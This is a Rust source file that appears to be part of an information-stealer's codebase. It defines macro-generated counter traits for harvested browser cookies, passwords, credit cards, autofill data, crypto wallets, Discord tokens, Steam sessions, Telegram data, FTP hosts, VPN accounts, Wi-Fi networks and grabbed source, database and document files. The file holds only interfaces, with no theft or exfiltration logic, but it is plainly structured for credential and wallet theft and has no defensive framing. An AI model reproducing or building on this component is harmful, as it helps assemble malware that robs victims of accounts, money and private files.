#![no_std]

extern crate alloc;
pub mod atomic;

macro_rules! increase_count {
    ($name:ident) => {
        paste::paste! {
            fn [<increase_ $name _by>](&self, count: usize);

            fn [<increase_ $name>](&self) {
                self.[<increase_ $name _by>](1);
            }

            fn [<get_ $name>](&self) -> usize;
        }
    };
}

#[allow(unused_macros)]
macro_rules! flag {
    ($name:ident) => {
        paste::paste! {
            fn [<set_ $name>](&self);

            fn [<is_ $name>](&self) -> bool;
        }
    };
}

pub trait Browser: Send + Sync {
    increase_count!(cookies);
    increase_count!(passwords);
    increase_count!(credit_cards);
    increase_count!(auto_fills);
    increase_count!(history);
    increase_count!(bookmarks);
    increase_count!(downloads);
}

pub trait Software: Send + Sync {
    increase_count!(wallets);
    increase_count!(ftp_hosts);
    flag!(telegram);
    increase_count!(discord_tokens);
    increase_count!(steam_session);
}

pub trait FileGrabber: Send + Sync {
    increase_count!(source_code_files);
    increase_count!(database_files);
    increase_count!(documents);
}

pub trait Vpn: Send + Sync {
    increase_count!(accounts);
}

pub trait Device: Send + Sync {
    increase_count!(wifi_networks);
}

pub trait Collector: Send + Sync
{
    type Browser: Browser;
    type Software: Software;
    type FileGrabber: FileGrabber;
    type Vpn: Vpn;
    type Device: Device;

    fn browser(&self) -> &Self::Browser;

    fn software(&self) -> &Self::Software;

    fn file_grabber(&self) -> &Self::FileGrabber;

    fn vpn(&self) -> &Self::Vpn;

    fn device(&self) -> &Self::Device;
}